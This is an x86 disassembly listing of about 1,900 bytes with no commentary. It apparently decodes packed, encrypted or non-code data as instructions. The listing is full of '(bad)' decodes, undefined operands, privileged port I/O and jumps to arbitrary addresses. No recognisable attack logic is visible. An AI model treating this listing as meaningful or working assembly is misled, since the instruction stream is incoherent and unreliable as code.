  40d4af:	outs   dx,DWORD PTR ds:[esi]
  40d4b0:	sub    dh,BYTE PTR [ebp+0x72]
  40d4b3:	je     0x40d533
  40d4b5:	ror    ecx,1
  40d4b7:	jecxz  0x40d493
  40d4b9:	lahf   
  40d4ba:	cli    
  40d4bb:	pop    es
  40d4bc:	xchg   esi,eax
  40d4bd:	adc    DWORD PTR [ebp-0x252a41ae],0xffffff93
  40d4c4:	repnz mov esi,0x3349f0f8
  40d4ca:	push   DWORD PTR [esi+eiz*8]
  40d4cd:	int    0xf0
  40d4cf:	xor    bh,BYTE PTR [ecx+0x25684b6a]
  40d4d5:	in     eax,0x8
  40d4d7:	retf   0xaa5f
  40d4da:	xchg   dl,dh
  40d4dc:	sbb    DWORD PTR [ebp-0x5b],esi
  40d4df:	or     BYTE PTR [edx-0x10afff56],dh
  40d4e5:	inc    ebp
  40d4e6:	mov    esp,0xc3d79941
  40d4eb:	jb     0x40d54a
  40d4ed:	fild   WORD PTR [edx+0x79f615c0]
  40d4f3:	mov    WORD PTR [ebx-0x3c],ss
  40d4f6:	aas    
  40d4f7:	fdivr  st(5),st
  40d4f9:	sti    
  40d4fa:	test   BYTE PTR [edi-0x5d599edf],0x9e
  40d501:	test   DWORD PTR [ebx-0x80],ebx
  40d504:	mov    DWORD PTR [ecx],eax
  40d506:	push   ebp
  40d507:	and    BYTE PTR [ebx-0x334de1ad],bl
  40d50d:	inc    eax
  40d50e:	inc    ebp
  40d50f:	mov    al,BYTE PTR [esi+eax*2+0x76]
  40d513:	mov    ah,0xc
  40d515:	adc    eax,0x5de77523
  40d51a:	lods   eax,DWORD PTR ds:[esi]
  40d51b:	sub    eax,0x31211d19
  40d520:	push   edi
  40d521:	sahf   
  40d522:	xor    eax,0x9d52622
  40d527:	pop    edx
  40d528:	xchg   ecx,eax
  40d529:	repnz mov dl,0xf5
  40d52c:	push   0x62
  40d52e:	pop    esi
  40d52f:	sbb    dl,ch
  40d531:	mov    ah,0xe6
  40d533:	mov    edi,0x2530faae
  40d538:	(bad)  
  40d539:	sti    
  40d53a:	xchg   ebp,eax
  40d53b:	arpl   WORD PTR [edx-0x43],sp
  40d53e:	cmp    edx,ebp
  40d540:	adc    ah,ch
  40d542:	stos   DWORD PTR es:[edi],eax
  40d543:	lods   al,BYTE PTR ds:[esi]
  40d544:	lods   al,BYTE PTR ds:[esi]
  40d545:	mov    al,ds:0x966346dc
  40d54a:	pushf  
  40d54b:	stos   DWORD PTR es:[edi],eax
  40d54c:	pop    esi
  40d54d:	inc    ebp
  40d54e:	jmp    0x40d543
  40d550:	cmp    BYTE PTR [eax-0x43d482f8],bh
  40d556:	sar    BYTE PTR [ebx+0x7b66d260],1
  40d55c:	bnd jnp 0x40d51a
  40d55f:	imul   ebp,DWORD PTR [esi+0x4a80ad5a],0x340d51d3
  40d569:	sub    ebx,0x65
  40d56c:	pop    ss
  40d56d:	das    
  40d56e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d56f:	cwde   
  40d570:	leave  
  40d571:	das    
  40d572:	push   eax
  40d573:	mov    dl,0x5
  40d575:	cld    
  40d576:	jnp    0x40d512
  40d578:	mov    al,ds:0xa6766eac
  40d57d:	stc    
  40d57e:	mov    eax,0x51244a3c
  40d583:	loope  0x40d5e2
  40d585:	mov    ds:0xd6e3f584,al
  40d58a:	pop    edi
  40d58b:	xor    ecx,DWORD PTR [edx+0x15]
  40d58e:	mov    ds:0xf50e1e3d,al
  40d593:	add    bh,BYTE PTR [ebx-0x6ca895a1]
  40d599:	retf   0x79b4
  40d59c:	in     eax,dx
  40d59d:	std    
  40d59e:	dec    eax
  40d59f:	fwait
  40d5a0:	and    ebp,eax
  40d5a2:	inc    eax
  40d5a3:	bound  ecx,QWORD PTR [edi]
  40d5a5:	mov    ds,esp
  40d5a7:	adc    bh,BYTE PTR [ecx]
  40d5a9:	aaa    
  40d5aa:	add    cl,BYTE PTR [edx+0x6b]
  40d5ad:	mov    dh,0x19
  40d5af:	aad    0xdf
  40d5b1:	mov    esp,0x6a07dfb3
  40d5b7:	mov    bl,0xee
  40d5b9:	lods   eax,DWORD PTR ds:[esi]
  40d5ba:	xchg   ebp,eax
  40d5bb:	xlat   BYTE PTR ds:[ebx]
  40d5bc:	pop    edx
  40d5bd:	and    esi,DWORD PTR [ebx]
  40d5bf:	aaa    
  40d5c0:	lock pop ebx
  40d5c2:	(bad)  
  40d5c3:	mov    WORD PTR [ecx-0x57],cs
  40d5c6:	or     DWORD PTR [edx+0x7dae2882],0x41
  40d5cd:	xchg   edx,eax
  40d5ce:	and    bl,BYTE PTR [edi]
  40d5d0:	cmp    eax,0x2b3aeae5
  40d5d5:	push   cs
  40d5d6:	das    
  40d5d7:	in     eax,dx
  40d5d8:	enter  0xdfea,0x8
  40d5dc:	cmp    BYTE PTR [edx-0x72],dh
  40d5df:	xor    al,0xf2
  40d5e1:	cld    
  40d5e2:	jmp    0xc1673680
  40d5e7:	adc    eax,0x1071c0c0
  40d5ec:	push   edi
  40d5ed:	std    
  40d5ee:	sbb    esi,DWORD PTR [eax]
  40d5f0:	dec    edx
  40d5f1:	sub    al,BYTE PTR [ecx+0x4b4d4ca3]
  40d5f7:	(bad)  
  40d5f8:	cmp    eax,0x79db57c6
  40d5fd:	ss and eax,0xb8ca6a94
  40d603:	cli    
  40d604:	sbb    eax,0x78a35ce2
  40d609:	shl    DWORD PTR [ebp+esi*2+0x731ff07f],1
  40d610:	dec    esi
  40d611:	jecxz  0x40d640
  40d613:	push   es
  40d614:	pop    eax
  40d615:	leave  
  40d616:	out    dx,eax
  40d617:	sub    al,0xe5
  40d619:	retf   0xbd8b
  40d61c:	add    eax,0xe8371948
  40d621:	sub    al,BYTE PTR [edi+0x7f]
  40d624:	lods   al,BYTE PTR ds:[esi]
  40d625:	or     DWORD PTR [edx+0x41],eax
  40d628:	sbb    al,0xab
  40d62a:	xchg   ebp,eax
  40d62b:	aas    
  40d62c:	inc    ebp
  40d62d:	es inc esi
  40d62f:	mov    eax,0x2beab4ec
  40d634:	rcr    DWORD PTR [esi+0x205e1af],cl
  40d63a:	fdivr  DWORD PTR [ebp+0x1f]
  40d63d:	data16 and BYTE PTR [eax+0x77],ah
  40d641:	mov    esp,DWORD PTR [esi+edi*8]
  40d644:	sub    BYTE PTR [eax+0x2057b4f6],bl
  40d64a:	in     eax,0x1b
  40d64c:	push   ebx
  40d64d:	xchg   cl,cl
  40d64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d650:	loop   0x40d634
  40d652:	out    0xa,al
  40d654:	sbb    cl,dl
  40d656:	aad    0x0
  40d658:	ja     0x40d642
  40d65a:	aaa    
  40d65b:	shr    edi,0xa7
  40d65e:	call   0x4b3e2e19
  40d663:	push   eax
  40d664:	daa    
  40d665:	push   ebx
  40d666:	push   eax
  40d667:	add    DWORD PTR [edx-0x34cae8c0],ecx
  40d66d:	mov    bl,BYTE PTR [esi]
  40d66f:	mov    al,dh
  40d671:	icebp  
  40d672:	xor    DWORD PTR [edi-0x6774e616],ebp
  40d678:	outs   dx,DWORD PTR ds:[esi]
  40d679:	jle    0x40d654
  40d67b:	adc    edx,eax
  40d67d:	pusha  
  40d67e:	push   ebp
  40d67f:	inc    ebp
  40d680:	cmp    al,0x3f
  40d682:	test   eax,0xfdefd65f
  40d687:	mov    ds:0x8597f0be,eax
  40d68c:	add    edx,edi
  40d68e:	popa   
  40d68f:	inc    edi
  40d690:	xchg   esi,eax
  40d691:	daa    
  40d692:	push   eax
  40d694:	xchg   ebp,eax
  40d695:	cmp    BYTE PTR [esi],dl
  40d697:	cwde   
  40d698:	jns    0x40d703
  40d69a:	adc    bh,BYTE PTR [ebp-0x7b]
  40d69d:	test   BYTE PTR [edi],dl
  40d69f:	adc    BYTE PTR [ebx],bl
  40d6a1:	dec    edi
  40d6a2:	(bad)  
  40d6a4:	fisttp WORD PTR [eax]
  40d6a6:	cmp    eax,0x56ac770d
  40d6ab:	push   0xf03f6ee5
  40d6b0:	bound  ebx,QWORD PTR [ecx+ebp*4]
  40d6b3:	adc    DWORD PTR ds:0x67014c96,ecx
  40d6b9:	push   edx
  40d6ba:	dec    eax
  40d6bb:	data16 xor al,0xdf
  40d6be:	sub    eax,0xe6466a95
  40d6c3:	or     ch,BYTE PTR [ecx]
  40d6c5:	adc    al,0x58
  40d6c7:	inc    eax
  40d6c8:	gs mov ebx,0x356e1fa6
  40d6ce:	retf   
  40d6cf:	cmp    al,0x53
  40d6d1:	std    
  40d6d2:	push   ebx
  40d6d3:	aad    0x49
  40d6d5:	dec    ebp
  40d6d6:	inc    edx
  40d6d7:	lods   al,BYTE PTR ds:[esi]
  40d6d8:	arpl   bx,cx
  40d6da:	aam    0x7c
  40d6dc:	mov    esp,0x30df5e54
  40d6e1:	in     al,0x26
  40d6e3:	imul   edx,eax,0xffffffcf
  40d6e6:	mov    esp,fs
  40d6e8:	mov    ah,0xb0
  40d6ea:	cmp    ecx,DWORD PTR [edi+ebx*1-0x2ffbe917]
  40d6f1:	jo     0x40d6f8
  40d6f3:	xchg   ecx,ecx
  40d6f5:	push   ds
  40d6f6:	push   ecx
  40d6f7:	arpl   WORD PTR [edx+0x9bd868],si
  40d6fd:	test   BYTE PTR [ebp-0x6a213c17],0x2
  40d704:	and    ebp,ebx
  40d706:	dec    ebx
  40d707:	jmp    FWORD PTR [edx-0x151b857e]
  40d70d:	retf   0x53cd
  40d710:	icebp  
  40d711:	xor    eax,0x2454ea5a
  40d716:	push   esi
  40d717:	xchg   ecx,eax
  40d718:	push   esp
  40d719:	mov    dl,0xa
  40d71b:	std    
  40d71c:	daa    
  40d71d:	arpl   sp,sp
  40d71f:	xor    ch,BYTE PTR [edx+0x11]
  40d722:	push   esi
  40d723:	lock pop edx
  40d725:	lahf   
  40d726:	aam    0x67
  40d728:	in     eax,0x6b
  40d72a:	ja     0x40d76d
  40d72c:	mov    ecx,DWORD PTR [ecx]
  40d72e:	and    DWORD PTR [ecx],esi
  40d730:	in     eax,dx
  40d731:	bound  edi,QWORD PTR [edi]
  40d733:	ror    DWORD PTR [edi],1
  40d735:	mov    es,WORD PTR [ebp-0x48c227ad]
  40d73b:	mov    bh,0x61
  40d73d:	pop    ds
  40d73e:	ins    DWORD PTR es:[edi],dx
  40d73f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d740:	sbb    BYTE PTR [edi+0x7c2f766b],bh
  40d746:	mov    bh,0x68
  40d748:	pushf  
  40d749:	xor    eax,0x3cd1bfdb
  40d74e:	enter  0x38c5,0xf6
  40d752:	mov    dh,BYTE PTR [edi+0xd]
  40d755:	cdq    
  40d756:	push   ecx
  40d757:	jecxz  0x40d78d
  40d759:	sub    DWORD PTR [eax+eiz*8],0xc4d6415a
  40d760:	fsubr  DWORD PTR [ebp-0x2a87b4cf]
  40d766:	aad    0xad
  40d768:	xor    edx,DWORD PTR [ecx+0x25]
  40d76b:	xor    eax,0xbc49001c
  40d770:	jp     0x40d7bc
  40d772:	xchg   edi,eax
  40d773:	pushf  
  40d774:	pinsrw mm5,WORD PTR [esi+0x39],0x29
  40d779:	mov    esp,0xd1a0a6ff
  40d77e:	and    eax,0x3872f697
  40d783:	pop    esp
  40d784:	push   esp
  40d785:	or     eax,0xce5e3594
  40d78a:	sub    bl,BYTE PTR [edi-0x1bde73f5]
  40d790:	inc    esi
  40d791:	(bad)  
  40d792:	sbb    eax,0xa1e2ccf8
  40d797:	mov    fs,WORD PTR [edi+esi*2]
  40d79a:	push   edx
  40d79b:	cmp    BYTE PTR [ebx],ch
  40d79d:	outs   dx,DWORD PTR ds:[esi]
  40d79e:	call   0x1ab0:0x3dc29b3c
  40d7a5:	enter  0x9664,0xec
  40d7a9:	or     DWORD PTR [esi+0x74],esi
  40d7ac:	xchg   ecx,eax
  40d7ad:	scas   eax,DWORD PTR es:[edi]
  40d7ae:	jmp    0x7124:0x25688454
  40d7b5:	les    ebx,FWORD PTR [ebx]
  40d7b7:	repnz pop ss
  40d7b9:	push   cs
  40d7ba:	aas    
  40d7bb:	add    dl,BYTE PTR [eax-0x4b4f1a3]
  40d7c1:	mov    ebp,0x210f7b72
  40d7c6:	jecxz  0x40d7cd
  40d7c8:	nop
  40d7c9:	cld    
  40d7ca:	jno    0x40d7e1
  40d7cc:	clc    
  40d7cd:	jbe    0x40d78e
  40d7cf:	pop    es
  40d7d0:	repz cld 
  40d7d2:	fmul   DWORD PTR [ecx-0x3cb48764]
  40d7d8:	imul   edx,DWORD PTR ds:0xb2aea9a7,0x68486f1b
  40d7e2:	ins    BYTE PTR es:[edi],dx
  40d7e3:	std    
  40d7e4:	sub    ecx,DWORD PTR [ecx]
  40d7e6:	sti    
  40d7e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e8:	cmc    
  40d7e9:	popa   
  40d7ea:	fs lock sti 
  40d7ed:	sub    esp,DWORD PTR [ebp+esi*4+0x30]
  40d7f1:	sbb    ch,dl
  40d7f3:	xchg   edx,eax
  40d7f4:	xchg   esi,eax
  40d7f5:	cmp    al,BYTE PTR [ebp+0x64]
  40d7f8:	xor    eax,0x23556967
  40d7fd:	cmp    DWORD PTR [edx+0x411d1218],0x2c390fc2
  40d807:	mov    cl,0x3a
  40d809:	popa   
  40d80a:	inc    eax
  40d80b:	cmc    
  40d80c:	pop    edi
  40d80d:	pushf  
  40d80e:	and    DWORD PTR [edi],esi
  40d810:	jge    0x40d81f
  40d812:	fdiv   DWORD PTR [edx+0x29849de8]
  40d818:	fs js  0x40d7eb
  40d81b:	shl    esi,cl
  40d81d:	or     BYTE PTR [edi],dl
  40d81f:	shl    DWORD PTR [edx-0x15c97c06],0x8f
  40d826:	gs jp  0x40d7d9
  40d829:	inc    ecx
  40d82a:	stc    
  40d82b:	(bad)  
  40d82c:	fisubr WORD PTR [edx]
  40d82e:	cmp    DWORD PTR [ebx],0x232505e0
  40d834:	sbb    BYTE PTR [ecx-0x6a359e7d],bh
  40d83a:	sub    esi,DWORD PTR [ebx-0x62]
  40d83d:	adc    ch,BYTE PTR [edi]
  40d83f:	dec    edx
  40d840:	ds push ds
  40d842:	or     BYTE PTR [ebp+edi*4-0x49a50bb3],cl
  40d849:	mov    bl,0x0
  40d84b:	jg     0x40d8bb
  40d84d:	add    al,BYTE PTR [eax]
  40d84f:	inc    ecx
  40d850:	jo     0x40d83e
  40d852:	jae    0x40d8cd
  40d854:	mov    DWORD PTR [eax],ebp
  40d856:	cmp    DWORD PTR [ecx-0x7a],esp
  40d859:	push   cs
  40d85a:	fwait
  40d85b:	std    
  40d85c:	pop    ds
  40d85d:	clc    
  40d85e:	pop    edi
  40d85f:	push   ebx
  40d860:	jns    0x40d812
  40d862:	jnp    0x40d84b
  40d864:	sbb    ch,BYTE PTR [ebx]
  40d866:	stos   DWORD PTR es:[edi],eax
  40d867:	popa   
  40d868:	ret    0x3c7c
  40d86b:	sub    edx,DWORD PTR [ebx+0x7decb792]
  40d871:	pop    ecx
  40d872:	addr16 inc ecx
  40d874:	mov    al,0xa8
  40d876:	pop    eax
  40d877:	sahf   
  40d878:	outs   dx,DWORD PTR ds:[esi]
  40d879:	cmp    edx,DWORD PTR [edi]
  40d87b:	sbb    BYTE PTR [esi-0x36],dh
  40d87e:	and    edx,esi
  40d880:	mov    al,0x57
  40d882:	adc    esp,ebx
  40d884:	gs sbb eax,0xc4ac944
  40d88a:	(bad)  
  40d88c:	iret   
  40d88d:	mov    ecx,0xb180c23d
  40d892:	sbb    eax,0x5c7b314c
  40d897:	push   edi
  40d898:	in     al,dx
  40d899:	into   
  40d89a:	fist   DWORD PTR [ebx-0x2d]
  40d89d:	mov    dl,0x5a
  40d89f:	stc    
  40d8a0:	and    DWORD PTR [ebx-0x686a99f2],0xffffffbf
  40d8a7:	scas   eax,DWORD PTR es:[edi]
  40d8a8:	dec    ebx
  40d8a9:	arpl   bp,sp
  40d8ab:	mov    ebp,0x98310ff4
  40d8b0:	lock enter 0xa98d,0x3e
  40d8b5:	xchg   ebx,eax
  40d8b6:	add    DWORD PTR [esi-0x5c],eax
  40d8b9:	mov    dl,0xc6
  40d8bb:	push   cs
  40d8bc:	mov    eax,0xfaaa95da
  40d8c1:	out    dx,eax
  40d8c2:	fst    DWORD PTR [edi]
  40d8c4:	pop    edi
  40d8c5:	cs scas al,BYTE PTR es:[edi]
  40d8c7:	xor    dh,ch
  40d8c9:	xor    edx,ebx
  40d8cb:	mov    ah,0xb0
  40d8cd:	inc    ebp
  40d8ce:	out    0x83,eax
  40d8d0:	lods   al,BYTE PTR ds:[esi]
  40d8d1:	jp     0x40d912
  40d8d3:	lahf   
  40d8d4:	mov    dl,0xf3
  40d8d6:	mov    ah,0xfe
  40d8d8:	add    ah,al
  40d8da:	in     eax,0xcc
  40d8dc:	push   esp
  40d8dd:	sbb    edi,DWORD PTR [ecx-0x1a4138da]
  40d8e3:	(bad)  
  40d8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d8e6:	xor    al,0xb4
  40d8e8:	pop    esi
  40d8e9:	call   0x24b3bcc4
  40d8ee:	pop    eax
  40d8ef:	(bad)  [ebx]
  40d8f1:	jne    0x40d953
  40d8f3:	stos   DWORD PTR es:[edi],eax
  40d8f4:	les    edi,FWORD PTR [ebx-0x78]
  40d8f7:	hlt    
  40d8f8:	popf   
  40d8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8fa:	mov    ebp,0x7dbf61a
  40d8ff:	out    0x66,eax
  40d901:	sub    esp,esi
  40d903:	imul   ebx,DWORD PTR [esi-0x3910f61b],0x52fac299
  40d90d:	push   ebp
  40d90e:	mov    dl,0xe4
  40d910:	push   es
  40d911:	arpl   WORD PTR [ecx-0x42d6ae2f],bx
  40d917:	mov    edi,0x8d5316d8
  40d91c:	(bad)  
  40d91d:	xor    BYTE PTR [ebx+ecx*8+0x4b],dl
  40d921:	jle    0x40d8af
  40d923:	jne    0x40d8b8
  40d925:	ins    BYTE PTR es:[edi],dx
  40d926:	test   al,0xd4
  40d928:	imul   ecx,DWORD PTR [edi+0x722e8b83],0xa1818d08
  40d932:	loope  0x40d933
  40d934:	add    BYTE PTR [eax],al
  40d936:	mov    bl,0xa7
  40d938:	aaa    
  40d939:	sbb    al,0xf7
  40d93b:	adc    edx,DWORD PTR [esi-0x1273f610]
  40d941:	mov    edi,0x877f154c
  40d946:	adc    BYTE PTR [ecx],dh
  40d948:	xor    eax,0xf506f956
  40d94d:	repnz cmp DWORD PTR [ecx],ebp
  40d950:	stos   BYTE PTR es:[edi],al
  40d951:	iret   
  40d952:	jns    0x40d9b1
  40d954:	pop    ebp
  40d955:	cmp    bh,bl
  40d957:	int    0xb9
  40d959:	mov    ch,0x72
  40d95b:	xchg   ebx,eax
  40d95c:	inc    esp
  40d95d:	cmc    
  40d95e:	pushf  
  40d95f:	push   0x25
  40d961:	jl     0x40d9b1
  40d963:	cdq    
  40d964:	inc    di
  40d966:	loopne 0x40d96c
  40d968:	and    eax,0x29a49e23
  40d96d:	sti    
  40d96e:	imul   esi,ebx,0x64
  40d971:	sar    BYTE PTR [esp+ebx*1-0x5e],0xf
  40d976:	stc    
  40d977:	xchg   esp,eax
  40d978:	mov    bh,0xa7
  40d97a:	adc    DWORD PTR [edx-0x10],0xc093bb91
  40d981:	pop    esi
  40d982:	jmp    0xd3a600cf
  40d987:	dec    esp
  40d988:	cs cmp al,0x5
  40d98b:	mov    ?,WORD PTR [esi]
  40d98d:	add    bl,BYTE PTR [edi-0x2421c381]
  40d993:	jne    0x40da06
  40d995:	fisttp WORD PTR [ebx]
  40d997:	sbb    eax,0x86c7b547
  40d99c:	dec    eax
  40d99d:	or     al,0xc5
  40d99f:	scas   eax,DWORD PTR es:[edi]
  40d9a0:	lods   al,BYTE PTR ds:[esi]
  40d9a1:	ds in  eax,dx
  40d9a3:	pop    es
  40d9a4:	sub    bl,bh
  40d9a6:	adc    BYTE PTR [ecx],0x50
  40d9a9:	mov    al,0x9c
  40d9ab:	jge    0x40da29
  40d9ad:	les    edx,FWORD PTR [ebx]
  40d9af:	cmp    edi,DWORD PTR [ecx]
  40d9b1:	jmp    0x92e8e2de
  40d9b6:	loop   0x40d952
  40d9b8:	dec    esp
  40d9b9:	push   0x27
  40d9bb:	je     0x40d9c1
  40d9bd:	enter  0xa0fe,0xfb
  40d9c1:	nop
  40d9c2:	jp     0x40da3d
  40d9c4:	dec    ebx
  40d9c5:	xlat   BYTE PTR ds:[ebx]
  40d9c6:	hlt    
  40d9c7:	repz xlat BYTE PTR ds:[ebx]
  40d9c9:	cmp    ecx,DWORD PTR [ebp-0x77]
  40d9cc:	fimul  DWORD PTR [eax+0x6fd5ed8d]
  40d9d2:	adc    edx,edx
  40d9d4:	retf   
  40d9d5:	sbb    ebp,DWORD PTR [ebx]
  40d9d7:	and    ah,BYTE PTR [ebx+eax*4]
  40d9da:	fmul   DWORD PTR [esi+0x39d2a81d]
  40d9e0:	es push ebx
  40d9e2:	pop    ds
  40d9e3:	mov    cl,0x82
  40d9e5:	push   ebx
  40d9e6:	outs   dx,BYTE PTR ds:[esi]
  40d9e7:	in     eax,0x9a
  40d9e9:	daa    
  40d9ea:	(bad)  
  40d9eb:	shr    BYTE PTR [ebx+ebx*8+0x20cb39b],cl
  40d9f2:	jge    0x40d9b6
  40d9f4:	(bad)  
  40d9f5:	jns    0x40d998
  40d9f7:	inc    edi
  40d9f8:	xchg   esp,eax
  40d9f9:	and    dh,BYTE PTR [edx]
  40d9fb:	jle    0x40da6a
  40d9fd:	push   esp
  40d9fe:	js     0x40d9ac
  40da00:	aaa    
  40da01:	jae    0x40da05
  40da03:	and    edi,DWORD PTR [esi-0x5e589f44]
  40da09:	leave  
  40da0a:	arpl   WORD PTR [esi+0x54],di
  40da0d:	(bad)  
  40da0e:	jno    0x40d9bf
  40da10:	fdiv   QWORD PTR [edi]
  40da12:	xor    bl,BYTE PTR [esi+ebp*4+0x30]
  40da16:	retf   0xc65e
  40da19:	add    al,0xbb
  40da1b:	dec    edx
  40da1c:	push   edx
  40da1d:	xchg   ebp,eax
  40da1e:	sbb    dh,BYTE PTR [ecx+0x117b8c59]
  40da24:	pop    edx
  40da25:	stos   BYTE PTR es:[edi],al
  40da26:	std    
  40da27:	mov    bh,0x88
  40da29:	inc    ebx
  40da2a:	les    ebx,FWORD PTR [esi-0x74a9c44]
  40da30:	and    esi,DWORD PTR [ecx]
  40da32:	pop    eax
  40da33:	push   esi
  40da34:	(bad)  [edx-0x4e0fffb]
  40da3a:	pop    ebx
  40da3b:	retf   0xa60a
  40da3e:	fcomp  DWORD PTR ds:0x10725f3d
  40da44:	jg     0x40da92
  40da46:	jb     0x40d9e2
  40da48:	cmp    BYTE PTR [eax],bh
  40da4a:	pushf  
  40da4b:	icebp  
  40da4c:	(bad)
  40da4f:	and    ebp,ebx
  40da51:	mov    ebp,0x79399c39
  40da56:	or     BYTE PTR [eax],0x5d
  40da59:	adc    eax,0xa3e81525
  40da5e:	add    bl,BYTE PTR [ebp+0x1c]
  40da61:	xchg   BYTE PTR [ecx],bh
  40da63:	xor    BYTE PTR [esi+0x15d88563],dh
  40da69:	cmc    
  40da6a:	add    dl,BYTE PTR [ebx]
  40da6c:	cmc    
  40da6d:	mov    bl,0xed
  40da6f:	mov    bl,0xc5
  40da71:	aaa    
  40da72:	mov    al,0xc6
  40da74:	inc    ebx
  40da75:	inc    edx
  40da76:	loop   0x40dae9
  40da78:	iret   
  40da79:	push   es
  40da7a:	push   ecx
  40da7b:	sti    
  40da7c:	fcmovnu st,st(1)
  40da7e:	push   eax
  40da7f:	sbb    edx,DWORD PTR [ecx-0x10]
  40da82:	faddp  st(4),st
  40da84:	lahf   
  40da85:	int3   
  40da86:	test   eax,0x8a7e5f24
  40da8b:	seta   BYTE PTR [ecx]
  40da8e:	int    0x3f
  40da90:	jo     0x40da14
  40da92:	outs   dx,BYTE PTR ds:[esi]
  40da93:	clc    
  40da94:	pushf  
  40da95:	cmc    
  40da96:	and    eax,0xe01372c0
  40da9b:	xor    eax,0xab83cb7a
  40daa0:	mov    bh,0x6a
  40daa2:	and    BYTE PTR [ebx],dl
  40daa4:	mov    al,0x83
  40daa6:	fistp  QWORD PTR [esi+0x7a]
  40daa9:	or     DWORD PTR gs:[esi-0x69],esp
  40daad:	adc    al,0xfb
  40daaf:	cmp    edi,esp
  40dab1:	jo     0x40da74
  40dab3:	jbe    0x40db25
  40dab5:	mov    bl,0x9b
  40dab7:	jecxz  0x40da5b
  40dab9:	clc    
  40daba:	call   0x224f:0x793a9f03
  40dac1:	fdiv   QWORD PTR [ebx-0x6e9dab1f]
  40dac7:	rcr    DWORD PTR [edx+0x62],1
  40daca:	psadbw mm7,QWORD PTR [edx]
  40dacd:	jbe    0x40db2e
  40dacf:	int3   
  40dad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dad1:	xchg   ecx,eax
  40dad2:	fwait
  40dad3:	pop    ecx
  40dad4:	inc    ecx
  40dad5:	lock and ah,BYTE PTR [edx+0x5f]
  40dad9:	mov    ch,0x12
  40dadb:	cmp    DWORD PTR [eax+eiz*4+0x1378ac3c],esp
  40dae2:	xor    dl,BYTE PTR [ebx+0x5b1f6bcc]
  40dae8:	popf   
  40dae9:	mov    esp,0x6cb5da01
  40daee:	repnz xchg esp,eax
  40daf0:	mov    al,0xaf
  40daf2:	(bad)  
  40daf3:	mov    esp,0xcc0f2c35
  40daf8:	test   DWORD PTR [edi],esi
  40dafa:	push   0x7f
  40dafc:	mov    bl,0xf6
  40dafe:	jecxz  0x40db7b
  40db00:	xchg   edi,eax
  40db01:	out    0x80,ax
  40db04:	jge    0x40dab7
  40db06:	inc    esi
  40db07:	or     ebx,DWORD PTR [edx+ecx*1+0x3a]
  40db0b:	out    dx,eax
  40db0c:	mov    ch,0xf0
  40db0e:	inc    ecx
  40db0f:	scas   eax,DWORD PTR es:[edi]
  40db10:	or     DWORD PTR [edi],esp
  40db12:	dec    ebx
  40db13:	mov    edx,0x10f7e68
  40db18:	in     eax,dx
  40db19:	dec    ecx
  40db1a:	mov    bl,0x43
  40db1c:	push   es
  40db1d:	jns    0x40db6a
  40db1f:	sbb    al,0xd0
  40db21:	or     cl,BYTE PTR [ebp+ebx*2-0x298dcceb]
  40db28:	enter  0x633b,0x6f
  40db2c:	mov    ebp,edx
  40db2e:	adc    cl,BYTE PTR [eax-0x16]
  40db31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db33:	inc    ebp
  40db34:	mov    ebp,0x2593cfdf
  40db39:	push   0xb2907910
  40db3e:	(bad)  
  40db3f:	push   esp
  40db40:	ss jo  0x40daf6
  40db43:	jmp    0x5b9063d4
  40db48:	popf   
  40db49:	adc    eax,ebx
  40db4b:	fnstenv [ebx]
  40db4d:	loope  0x40daee
  40db4f:	jbe    0x40dbbe
  40db51:	sub    al,0x34
  40db53:	std    
  40db54:	into   
  40db55:	sub    eax,0x755a6625
  40db5a:	cs push 0x70
  40db5d:	inc    BYTE PTR [ebx+0x4]
  40db60:	sub    BYTE PTR [esi],ah
  40db62:	or     al,0x21
  40db64:	nop
  40db65:	test   DWORD PTR [edi+0x6f],edx
  40db68:	jle    0x40db95
  40db6a:	retf   
  40db6b:	mov    ch,0x11
  40db6d:	out    0x30,al
  40db6f:	ins    BYTE PTR es:[edi],dx
  40db70:	retf   0xd8b
  40db73:	adc    al,0x6e
  40db75:	mov    esp,0xfc7cad61
  40db7a:	fisubr DWORD PTR [edi]
  40db7c:	mov    edx,0x84741ac4
  40db81:	mov    WORD PTR [edx+0x69887960],?
  40db87:	das    
  40db88:	mov    dl,BYTE PTR [eax+ebx*2+0x6936f3bf]
  40db8f:	xchg   edi,eax
  40db90:	fimul  DWORD PTR [esi]
  40db92:	inc    eax
  40db93:	sbb    ebx,0x42da75e1
  40db99:	pop    edx
  40db9a:	jl     0x40db79
  40db9c:	push   ss
  40db9d:	push   ecx
  40db9e:	xor    DWORD PTR [ecx-0x785ae7de],0xfffffffa
  40dba5:	cmp    ebp,esp
  40dba7:	xor    eax,0x667460c6
  40dbac:	mov    dh,0xa
  40dbae:	out    dx,eax
  40dbaf:	outs   dx,DWORD PTR ds:[esi]
  40dbb0:	je     0x40dc18
  40dbb2:	jp     0x40db37
  40dbb4:	pop    esp
  40dbb5:	loopne 0x40db60
  40dbb7:	mov    ebp,0xa7227923
  40dbbc:	mov    ch,0x7
  40dbbe:	imul   esi,edi,0x51913eb1
  40dbc4:	or     DWORD PTR [edx],esi
  40dbc6:	lods   al,BYTE PTR ds:[esi]
  40dbc7:	inc    esi
  40dbc8:	in     eax,0x6a
  40dbca:	aas    
  40dbcb:	dec    edi
  40dbcc:	xor    BYTE PTR [eax-0x5b2850e3],ah
  40dbd2:	out    dx,eax
  40dbd3:	xor    DWORD PTR [ebp-0x12],edx
  40dbd6:	scas   al,BYTE PTR es:[edi]
  40dbd7:	cdq    
  40dbd8:	cmp    al,0xc9
  40dbda:	adc    bl,BYTE PTR [edi]
  40dbdc:	rcr    DWORD PTR [esi-0x19],0xf
  40dbe0:	loopne 0x40dbbb
  40dbe2:	push   ds
  40dbe3:	(bad)  
  40dbe5:	jl     0x40db67
  40dbe7:	adc    eax,0x6539a0c5
  40dbec:	dec    ebp
  40dbed:	fimul  WORD PTR [eax]
  40dbef:	cmp    cl,BYTE PTR [edi+edx*1]
  40dbf2:	xchg   esp,eax
  40dbf3:	mov    eax,0x2e9d8a78
  40dbf8:	in     al,dx
  40dbf9:	repnz dec esp
  40dbfb:	mov    edi,0x4d96fee
